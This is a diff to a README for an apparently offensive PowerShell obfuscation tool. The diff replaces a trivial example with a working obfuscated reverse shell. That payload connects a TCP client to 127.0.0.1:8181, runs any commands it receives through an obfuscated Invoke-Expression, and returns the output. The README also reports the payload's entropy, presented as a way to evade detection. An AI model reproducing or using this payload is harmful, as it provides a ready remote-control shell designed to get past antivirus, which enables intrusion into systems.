@@ -13,13 +13,12 @@ python3 obfuscator.py -f <YOUR_PAYLOAD> -m <MODE>
 
 ```powershell
 PS C:\auto_powershell_obfuscation> python3 .\obfuscator.py -f .\test_payload.txt
-Payload 
-
-$var = $True;$var2 = $False;
 
 New Payload 
 
-$f75fc1bb5c6b4553a485859901a9128f = (9999 -eq 9999);$34a7d89f45c847fc8527e8c646d0f69b = !![bool]$null;
+$48b23f7aaadc4e96932c24c2fd6c1430 = N""ew-Object Sy''s""tem.Net.Sockets.TCPClient('127.0.0.1',8181);$be30aeef96bc427db72645b20e22b4bc = $48b23f7aaadc4e96932c24c2fd6c1430.GetStream();[byte[]]$0e2e781a1e26488f98d4d5057254669d = 0..65535|%{0};while(($143b0ba8bb9d4270963f5d48892cf60e = $be30aeef96bc427db72645b20e22b4bc.Read($0e2e781a1e26488f98d4d5057254669d, 0, $0e2e781a1e26488f98d4d5057254669d.Length)) -ne 0){;$b98b18b0b96a4336ab5c1b5f53172f6e = (New-Object -TypeName Syst""em.Text.ASCIIEncoding).GetString($0e2e781a1e26488f98d4d5057254669d,0, $143b0ba8bb9d4270963f5d48892cf60e);$82f0188570bb4842ae4d302dec137166 = (i""ex $b98b18b0b96a4336ab5c1b5f53172f6e 2>&1 | Out-String );$8a7ef545026b4a2e807bc6a667c70cbe = $82f0188570bb4842ae4d302dec137166 + 'PS ' + (pwd).Path + '> ';$2e6d40d1196a40569af7fac1184d3696 = ([text.encoding]::ASCII).GetBytes($8a7ef545026b4a2e807bc6a667c70cbe);$be30aeef96bc427db72645b20e22b4bc.Write($2e6d40d1196a40569af7fac1184d3696,0,$2e6d40d1196a40569af7fac1184d3696.Length);$be30aeef96bc427db72645b20e22b4bc.Flush()};$48b23f7aaadc4e96932c24c2fd6c1430.Close()
+
+New payload entropy: 5.138376499232824
 ```
 
 ## Mode
